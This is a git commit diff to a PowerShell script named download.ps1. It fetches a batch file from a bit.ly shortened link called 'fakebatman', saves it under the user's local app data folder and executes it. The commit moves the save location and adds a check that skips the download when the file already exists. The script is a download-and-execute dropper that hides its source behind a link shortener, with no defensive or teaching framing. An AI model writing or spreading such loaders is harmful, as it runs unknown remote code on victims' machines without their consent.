a3e78bc01a106b8fcffdff60bc524fc2eca62e88
43a1723 <hai1723notgay@gmail.com>
2024-07-29 15:57:23 +0700

    Update download.ps1

--- scr/download.ps1
+++ scr/download.ps1
@@ -1,4 +1,9 @@
 $url = "https://bit.ly/fakebatman"
-$output = "$env:temp\downloaded_file.bat"
-Invoke-WebRequest -Uri $url -OutFile $output
-Start-Process -FilePath $output
+$output = "$env:localappdata\downloaded_file.bat"
+
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+    Start-Process -FilePath $output
+}
